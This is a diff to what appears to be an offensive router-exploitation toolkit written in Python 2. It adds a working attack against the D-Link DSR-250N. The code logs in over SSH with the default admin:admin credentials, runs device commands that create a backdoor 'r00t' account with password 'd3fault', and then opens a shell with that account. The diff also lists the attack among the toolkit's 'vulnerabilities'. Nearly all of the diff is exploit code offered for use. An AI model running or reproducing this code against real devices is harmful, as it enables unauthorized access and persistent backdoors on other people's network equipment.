@@ -55,6 +55,47 @@ def run ( run ):
 		print '[+] Done.  Connect to 192.168.1.1 with \'admin:d3fault\''
 		print '[!] Page returned: '
 		print response.read()
+
+	elif run == 4:
+		# http://www.exploit-db.com/exploits/22930/
+		try:
+			import paramiko
+		except ImportError:
+			Error('Attack requires Paramiko library.')
+			return
+
+		Msg('Adding user \'r00t\' password \'d3fault\'...')
+		# ssh in with admin:admin
+		try:
+			ssh = paramiko.SSHClient()
+			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			connection = ssh.connect('192.168.1.1',22,username='admin',
+										password='admin',timeout=3.0)
+			channel = connection.get_transport().open_session()
+			# add the user
+			channel.exec_command('system users edit 1')
+			channel.exec_command('username r00t')
+			channel.exec_command('password d3fault')
+			channel.exec_command('save')
+			connection.close()
+		except paramiko.AuthenticationException:
+			Error('Default credentials disabled/incorrect.')
+			return
+		except Exception, j:
+			Error('Error with SSH: %s'%j)
+			return
+
+		Msg('Done.  Logging in...')
+		try:
+			# ssh in with r00t:d3fault
+			ssh = paramiko.SSHClient()
+			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			ssh.connect('192.168.1.1',22,username='r00t',
+										password='d3fault',timeout=3.0)
+			ssh.invoke_shell()
+		except:
+			Error('Error invoking shell access.')
+			return
 #
 # router:vuln
 #
@@ -62,4 +103,5 @@ def vulnerabilities():
 	return [ 'DIR-605 v2.0 - Add Admin',
 			 'DIR-300 v1.04 - Add Admin',
 			 'DSL-2640B - Change Admin Password',
+             'DSR-250N - Backdoor root',
 			]
